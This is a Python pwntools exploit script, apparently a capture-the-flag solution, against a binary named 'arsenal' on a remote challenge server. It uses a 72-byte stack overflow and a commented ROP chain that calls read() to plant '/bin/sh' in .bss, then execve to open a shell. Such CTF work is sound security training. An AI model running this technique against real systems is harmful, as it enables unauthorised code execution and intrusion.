#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./arsenal', checksec=False)

p = remote("offsec.m0lecon.it", 13539)

OFFSET_TO_RIP = 72

# By running: nm ./arsenal | grep "ret"
# we find that:
POP_RDI_RET = 0x40196a  # register rdi is used to pass the first argument to a function (in this case, the pointer to the "/bin/sh" string)
POP_RSI_RET = 0x401973  # register rsi is used to pass the second argument to a function (in this case, NULL)
POP_RDX_RET = 0x40197c  # register rdx is used to pass the third argument to a function (in this case, NULL)
POP_RAX_RET = 0x401985  # register rax is used to store the syscall number before invoking syscall instruction
RET_GADGET = 0x401998   # ret intruction is used to align the stack before calling the syscall instruction
SYSCALL_RET = 0x40198e  # syscall instruction to invoke the system call with the arguments set in rax, rdi, rsi, and rdx


# ======= THE STRATEGY IS: =======
# Since we have gadgets to control all registers (rax, rdi, rsi, rdx) plus a syscall,
# the only missing piece is the string "/bin/sh" -> it exists nowhere in the binary !!!
# We solve this problem by invoking read() as a first syscall to write it ourselves into .bss section.
#
# Stage 1 => read(0, BSS, 8)
#            blocks on stdin, waits for us to send "/bin/sh\x00",
#            writes it into .bss (writable, fixed address, no PIE).
#
# Stage 2 => execve(BSS, NULL, NULL)
#            rdi points to the "/bin/sh" we just planted,
#            rsi and rdx are NULL -> syscall 59 (execve) -> shell.


# Target address to write the "/bin/sh\x00" string (this will be used as an argument for the execve syscall)
# .bss start => will hold "/bin/sh\x00"
BSS = elf.bss()       # or run: objdump -h ./arsenal | grep .bss

payload = flat(
    # Stage 1: Prepare the registers for the execve syscall
    b'A' * OFFSET_TO_RIP,
    p64(POP_RAX_RET), p64(0),   # set rax to 0 for the read() syscall
    p64(POP_RDI_RET), p64(0),   # read(0, ...) -> read from stdin
    p64(POP_RSI_RET), p64(BSS), # read(0, BSS, ...) -> write to .bss section
    p64(POP_RDX_RET), p64(8),   # read(0, BSS, 8) -> read 8 bytes (that will be "/bin/sh\x00") from stdin
    p64(SYSCALL_RET),           # invoke the read() syscall

    # Stage 2: Write "/bin/sh\x00" to the .bss section
    p64(POP_RAX_RET), p64(59),  # set rax to 59 for the execve() syscall
    p64(POP_RDI_RET), p64(BSS), # execve(BSS, ...) -> the first argument is the pointer to the "/bin/sh\x00" string in .bss
    p64(POP_RSI_RET), p64(0),   # execve(BSS, 0, ...) -> the second argument (argv) is set to NULL
    p64(POP_RDX_RET), p64(0),   # execve(BSS, 0, 0) -> the third argument (envp) is set to NULL
    p64(SYSCALL_RET)            # invoke the execve() syscall to execute "/bin/sh" and get a shell
)

p.recvuntil(b'[arsenal] The armory is open -- pick your weapons:')
p.send(payload)

p.send(b'/bin/sh\x00')  # send the "/bin/sh\x00" string to be written into .bss by the read() syscall

p.interactive()
